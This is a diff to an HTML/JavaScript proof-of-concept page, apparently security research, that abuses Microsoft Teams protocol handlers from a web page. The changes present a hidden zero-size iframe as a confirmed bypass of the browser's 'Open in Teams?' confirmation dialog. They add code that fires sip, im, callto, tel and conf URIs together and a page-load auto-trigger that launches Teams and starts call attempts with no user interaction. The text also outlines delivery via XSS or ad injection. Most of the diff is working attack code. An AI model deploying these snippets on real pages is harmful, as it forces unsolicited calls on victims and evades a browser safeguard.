@@ -189,6 +189,35 @@ tbody td { padding: 10px 12px; vertical-align: middle; }
 .test-btn:hover { border-color: var(--amber); background: rgba(249,115,22,.08); }
 .test-btn.fired { border-color: var(--red); color: #fca5a5; background: rgba(220,38,38,.1); }
 
+/* ── confirmed bypass card ── */
+.confirmed-card {
+  background: var(--surface);
+  border: 1px solid rgba(34,197,94,.35);
+  border-top: 3px solid var(--green);
+  border-radius: 10px;
+  overflow: hidden;
+}
+.confirmed-card .scenario-head {
+  background: rgba(34,197,94,.08);
+  border-bottom: 1px solid rgba(34,197,94,.2);
+}
+.confirmed-badge {
+  font-family: var(--mono); font-size: 10px; font-weight: 600; letter-spacing: .07em;
+  padding: 2px 8px; border-radius: 3px;
+  background: rgba(34,197,94,.15); color: #86efac;
+  border: 1px solid rgba(34,197,94,.3);
+  margin-left: auto;
+}
+.dialog-warn {
+  font-size: 11px; font-weight: 500;
+  background: rgba(249,115,22,.1); color: #fdba74;
+  border: 1px solid rgba(249,115,22,.25);
+  border-radius: 4px; padding: 5px 10px;
+  display: flex; align-items: center; gap: 6px;
+  font-family: var(--mono);
+}
+.iframe-btn-row { display: flex; flex-wrap: wrap; gap: 6px; }
+
 /* ── evidence box ── */
 .evidence {
   background: var(--surface);
@@ -303,84 +332,103 @@ footer { text-align: center; font-size: 11px; color: var(--fg2); padding-top: 8p
   <!-- ATTACK SCENARIOS -->
   <div>
     <div class="sec-head">Attack Scenarios</div>
-    <div class="scenario-grid">
+    <div style="display:flex;flex-direction:column;gap:14px;">
 
-      <!-- A1: Direct link -->
-      <div class="scenario">
-        <div class="scenario-head">
-          <span class="scenario-num">A1</span>
-          <span class="scenario-title">Direct Anchor Link</span>
-        </div>
-        <div class="scenario-body">
-          <p class="scenario-desc">A regular <code style="font-family:var(--mono);font-size:11px">&lt;a href="sip://…"&gt;</code> tag triggers the Teams call dialog when clicked. No browser confirmation shown for <code style="font-family:var(--mono);font-size:11px">sip://</code>, <code style="font-family:var(--mono);font-size:11px">callto://</code>, <code style="font-family:var(--mono);font-size:11px">im://</code> or <code style="font-family:var(--mono);font-size:11px">tel://</code> on most Windows configurations.</p>
-          <div class="code-block"><span class="code-comment">// HTML on attacker page</span>
-&lt;a href="sip://target@contoso.com"&gt;
-  Click here to view report
-&lt;/a&gt;</div>
-          <div class="trigger-row">
-            <span class="status-dot" id="dot-a1"></span>
-            <span class="status-label" id="lbl-a1">ready</span>
-            <a id="link-a1" href="#" onclick="fireLink('a1','sip'); return false;" class="btn btn-red">Fire sip:// link</a>
-          </div>
-        </div>
-      </div>
-
-      <!-- A2: JS location -->
-      <div class="scenario">
-        <div class="scenario-head">
-          <span class="scenario-num">A2</span>
-          <span class="scenario-title">JavaScript Location Override</span>
-        </div>
-        <div class="scenario-body">
-          <p class="scenario-desc">Setting <code style="font-family:var(--mono);font-size:11px">window.location</code> to a protocol URI fires the handler silently — no click required, runs from any inline script.</p>
-          <div class="code-block"><span class="code-comment">// Fires on page load, no click</span>
-window.location =
-  "sip://" + target;</div>
-          <div class="trigger-row">
-            <span class="status-dot" id="dot-a2"></span>
-            <span class="status-label" id="lbl-a2">ready</span>
-            <button class="btn btn-red" onclick="fireJS('a2','sip')">Fire via JS</button>
-          </div>
-        </div>
-      </div>
-
-      <!-- A3: callto silently -->
-      <div class="scenario">
-        <div class="scenario-head">
-          <span class="scenario-num">A3</span>
-          <span class="scenario-title">callto:// — Unsolicited Call</span>
-        </div>
-        <div class="scenario-body">
-          <p class="scenario-desc"><code style="font-family:var(--mono);font-size:11px">callto://</code> and <code style="font-family:var(--mono);font-size:11px">tel://</code> open the Teams call UI targeting the victim's address. The victim sees an outgoing call attempt appear on their screen. Can be triggered by visiting any webpage.</p>
-          <div class="code-block"><span class="code-comment">// Initiates unsolicited call</span>
-window.location =
-  "callto://" + target;</div>
-          <div class="trigger-row">
-            <span class="status-dot" id="dot-a3"></span>
-            <span class="status-label" id="lbl-a3">ready</span>
-            <button class="btn btn-amber" onclick="fireJS('a3','callto')">Fire callto://</button>
-            <button class="btn btn-ghost" onclick="fireJS('a3b','tel')">Fire tel://</button>
-          </div>
-        </div>
-      </div>
-
-      <!-- A4: hidden iframe -->
-      <div class="scenario">
+      <!-- A4: CONFIRMED BYPASS — full width, elevated -->
+      <div class="confirmed-card">
         <div class="scenario-head">
           <span class="scenario-num">A4</span>
-          <span class="scenario-title">Hidden iframe — Zero Visible Interaction</span>
+          <span class="scenario-title">Hidden iframe — Browser Dialog Bypassed</span>
+          <span class="confirmed-badge">✓ CONFIRMED BYPASS</span>
         </div>
         <div class="scenario-body">
-          <p class="scenario-desc">Setting a 0×0 hidden <code style="font-family:var(--mono);font-size:11px">&lt;iframe&gt;</code> src to a protocol URI fires the handler without the user seeing any element. Can be injected into existing pages via XSS or ad injection.</p>
-          <div class="code-block"><span class="code-comment">// 0×0 hidden iframe trigger</span>
+          <p class="scenario-desc">Setting a hidden <code style="font-family:var(--mono);font-size:11px">&lt;iframe src="im://…"&gt;</code> fires the Teams protocol handler <strong style="color:var(--fg)">without the browser showing any "Open in Teams?" confirmation dialog</strong>. All other methods (anchor link, <code style="font-family:var(--mono);font-size:11px">window.location</code>) trigger a browser confirmation prompt. The iframe route bypasses it. Teams is opened silently — the only signal is Teams appearing on screen. Can be dropped via XSS, ad injection, or any script execution on any page.</p>
+          <div class="code-block"><span class="code-comment">// No browser "Open in app?" dialog shown — confirmed on Chrome/Edge Windows</span>
 var f = document.createElement('iframe');
-f.style.cssText = 'display:none';
-f.src = "im://" + target;
-document.body.appendChild(f);</div>
-          <div class="trigger-row">
-            <span class="status-dot" id="dot-a4"></span>
-            <span class="status-label" id="lbl-a4">ready</span>
-            <button class="btn btn-red" onclick="fireIframe('a4','im')">Fire via iframe</button>
+f.style.cssText = 'position:absolute;width:0;height:0;border:0;visibility:hidden';
+f.src = "im://" + target;  <span class="code-comment">// swap any scheme</span>
+document.body.appendChild(f);
+
+<span class="code-comment">// Fire all schemes at once — one Teams launch per scheme</span>
+['sip','im','callto','tel','conf'].forEach(scheme => {
+  var f = document.createElement('iframe');
+  f.style.cssText = 'position:absolute;width:0;height:0;border:0;visibility:hidden';
+  f.src = scheme + "://" + target;
+  document.body.appendChild(f);
+});</div>
+          <div style="display:flex;flex-direction:column;gap:10px;">
+            <div class="iframe-btn-row">
+              <span class="status-dot" id="dot-a4"></span>
+              <span class="status-label" id="lbl-a4">ready</span>
+              <button class="btn btn-green" onclick="fireIframe('a4','sip')">iframe → sip://</button>
+              <button class="btn btn-green" onclick="fireIframe('a4b','im')">iframe → im://</button>
+              <button class="btn btn-green" onclick="fireIframe('a4c','callto')">iframe → callto://</button>
+              <button class="btn btn-green" onclick="fireIframe('a4d','tel')">iframe → tel://</button>
+              <button class="btn btn-amber" onclick="fireIframeAll()">Fire all schemes</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- A1/A2/A3 grid — shows browser dialog -->
+      <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px;">
+        <style>@media(max-width:680px){.a123-grid{grid-template-columns:1fr!important;}}</style>
+
+        <!-- A1 -->
+        <div class="scenario" style="border-top:3px solid var(--border);">
+          <div class="scenario-head">
+            <span class="scenario-num">A1</span>
+            <span class="scenario-title">Anchor Link</span>
+          </div>
+          <div class="scenario-body">
+            <div class="dialog-warn">⚠ Browser shows "Open in Teams?" dialog</div>
+            <div class="code-block"><span class="code-comment">// user must click through dialog</span>
+&lt;a href="sip://target"&gt;
+  Click here
+&lt;/a&gt;</div>
+            <div class="trigger-row">
+              <span class="status-dot" id="dot-a1"></span>
+              <span class="status-label" id="lbl-a1">ready</span>
+              <a href="#" onclick="fireLink('a1','sip'); return false;" class="btn btn-ghost" style="font-size:11px;">Test (shows dialog)</a>
+            </div>
+          </div>
+        </div>
+
+        <!-- A2 -->
+        <div class="scenario" style="border-top:3px solid var(--border);">
+          <div class="scenario-head">
+            <span class="scenario-num">A2</span>
+            <span class="scenario-title">JS window.location</span>
+          </div>
+          <div class="scenario-body">
+            <div class="dialog-warn">⚠ Browser shows "Open in Teams?" dialog</div>
+            <div class="code-block"><span class="code-comment">// dialog still shown</span>
+window.location =
+  "sip://" + target;</div>
+            <div class="trigger-row">
+              <span class="status-dot" id="dot-a2"></span>
+              <span class="status-label" id="lbl-a2">ready</span>
+              <button class="btn btn-ghost" style="font-size:11px;" onclick="fireJS('a2','sip')">Test (shows dialog)</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- A3 -->
+        <div class="scenario" style="border-top:3px solid var(--border);">
+          <div class="scenario-head">
+            <span class="scenario-num">A3</span>
+            <span class="scenario-title">window.open()</span>
+          </div>
+          <div class="scenario-body">
+            <div class="dialog-warn">⚠ Browser shows "Open in Teams?" dialog</div>
+            <div class="code-block"><span class="code-comment">// dialog still shown</span>
+window.open(
+  "callto://" + target);</div>
+            <div class="trigger-row">
+              <span class="status-dot" id="dot-a3"></span>
+              <span class="status-label" id="lbl-a3">ready</span>
+              <button class="btn btn-ghost" style="font-size:11px;" onclick="fireOpen('a3','callto')">Test (shows dialog)</button>
+            </div>
           </div>
         </div>
       </div>
@@ -394,21 +442,23 @@ document.body.appendChild(f);</div>
       <svg width="16" height="16" viewBox="0 0 16 16" fill="none" aria-hidden="true">
         <path d="M8 1.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13zM0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8zm8-3.5a.5.5 0 0 1 .5.5v3.25l2.146 2.147a.5.5 0 0 1-.707.707L7.5 8.707V5a.5.5 0 0 1 .5-.5z" fill="#fca5a5"/>
       </svg>
-      Auto-Trigger Demo — Simulates Page-Load Attack
+      Auto-Trigger Demo — Zero-Click Page-Load Attack (iframe method, no browser dialog)
     </h3>
-    <p>When enabled, starts a countdown then fires <code style="font-family:var(--mono);font-size:11px">sip://</code> automatically — exactly what a malicious page would do on <code style="font-family:var(--mono);font-size:11px">DOMContentLoaded</code>. This demonstrates that no user interaction is required beyond visiting the URL.</p>
+    <p>Simulates a malicious page that fires Teams <strong style="color:#fca5a5">silently on page load</strong> using the confirmed iframe bypass. No user interaction required. The only user-visible effect is Teams appearing on screen. The browser shows no dialog.</p>
     <div class="countdown-row">
       <div id="countdown-display">—</div>
       <div style="display:flex;flex-direction:column;gap:6px;">
-        <button class="btn btn-red" id="auto-btn" onclick="toggleAuto()">Start countdown (3s)</button>
+        <button class="btn btn-red" id="auto-btn" onclick="toggleAuto()">Start countdown (3s) → iframe fire</button>
         <span style="font-family:var(--mono);font-size:11px;color:var(--fg2);" id="auto-status">Auto-trigger: OFF</span>
       </div>
     </div>
-    <div class="code-block"><span class="code-comment">// Attacker embeds this in page — fires on load</span>
+    <div class="code-block"><span class="code-comment">// Malicious page — fires on DOMContentLoaded, no dialog shown</span>
 document.addEventListener('DOMContentLoaded', () => {
-  window.location = "sip://target@contoso.com";
-});
-<span class="code-comment">// Or via URL parameter: sip://victim injected from ?target= param</span></div>
+  var f = document.createElement('iframe');
+  f.style.cssText = 'position:absolute;width:0;height:0;border:0;visibility:hidden';
+  f.src = "sip://victim@contoso.com";  <span class="code-comment">// Teams opens, no browser dialog</span>
+  document.body.appendChild(f);
+});</div>
   </div>
 
   <!-- HANDLER TABLE -->
@@ -458,14 +508,15 @@ HKCU\Software\Classes\callto\
 <span class="code-comment">× 10 protocols declared</span></div>
         </div>
         <div class="ev-card">
-          <span class="ev-label">Attack chain</span>
+          <span class="ev-label">Confirmed attack chain (iframe bypass)</span>
           <div style="font-size:12px;color:var(--fg2);line-height:1.6;">
-            1. Victim visits any webpage (attacker-controlled or via ad injection)<br>
-            2. Page sets <code style="font-family:var(--mono);font-size:11px">window.location = "sip://victim@domain.com"</code><br>
+            1. Victim visits any webpage (attacker-controlled or via ad/XSS injection)<br>
+            2. Page creates hidden <code style="font-family:var(--mono);font-size:11px">iframe.src = "sip://victim@domain.com"</code><br>
             3. Browser dispatches URI to Windows Shell<br>
             4. Shell invokes <code style="font-family:var(--mono);font-size:11px">ms-teams.exe "sip://victim@domain.com"</code><br>
             5. Teams foregrounds and initiates call attempt<br>
-            <span style="color:#fca5a5">↳ No confirmation dialog shown for sip:// / callto:// / im:// / tel://</span>
+            <span style="color:#86efac">✓ iframe method: NO browser "Open in Teams?" dialog shown</span><br>
+            <span style="color:#fca5a5">anchor / window.location: browser dialog IS shown (blocked by user)</span>
           </div>
         </div>
         <div class="ev-card">
@@ -549,11 +600,29 @@ function fireJS(id, scheme) {
 function fireIframe(id, scheme) {
   const uri = scheme + ':' + getTarget(scheme);
   const f = document.createElement('iframe');
-  f.style.cssText = 'display:none;width:0;height:0;border:0;position:absolute';
+  f.style.cssText = 'position:absolute;width:0;height:0;border:0;visibility:hidden';
   f.src = uri;
   document.body.appendChild(f);
-  markFired('dot-'+id, 'lbl-'+id, 'iframe fired ✓');
-  toast('→ iframe src = ' + uri);
+  markFired('dot-'+id, 'lbl-'+id, 'iframe fired ✓ (no dialog)');
+  toast('→ iframe → ' + uri + ' (no browser dialog)');
+}
+
+function fireOpen(id, scheme) {
+  const uri = scheme + ':' + getTarget(scheme);
+  window.open(uri, '_blank');
+  markFired('dot-'+id, 'lbl-'+id, 'open fired ✓');
+  toast('→ ' + uri + ' (browser dialog shown)');
+}
+
+function fireIframeAll() {
+  const target = sipTarget.value.trim() || 'target@contoso.com';
+  ['sip','im','callto','tel','conf'].forEach(scheme => {
+    const f = document.createElement('iframe');
+    f.style.cssText = 'position:absolute;width:0;height:0;border:0;visibility:hidden';
+    f.src = scheme + '://' + target;
+    document.body.appendChild(f);
+  });
+  toast('→ Fired 5 schemes via iframe (no dialogs)', 3000);
 }
 
 function toggleAuto() {
@@ -578,11 +647,14 @@ function toggleAuto() {
       clearInterval(autoTimer);
       autoRunning = false;
       document.getElementById('countdown-display').textContent = '✓';
-      document.getElementById('auto-btn').textContent = 'Start countdown (3s)';
-      document.getElementById('auto-status').textContent = 'Auto-trigger: FIRED';
+      document.getElementById('auto-btn').textContent = 'Start countdown (3s) → iframe fire';
+      document.getElementById('auto-status').textContent = 'Auto-trigger: FIRED (iframe, no dialog)';
       const uri = 'sip:' + getTarget('sip');
-      window.location = uri;
-      toast('Auto-triggered → ' + uri, 3000);
+      const f = document.createElement('iframe');
+      f.style.cssText = 'position:absolute;width:0;height:0;border:0;visibility:hidden';
+      f.src = uri;
+      document.body.appendChild(f);
+      toast('Auto-triggered via iframe → ' + uri, 3000);
     }
   }, 1000);
 }
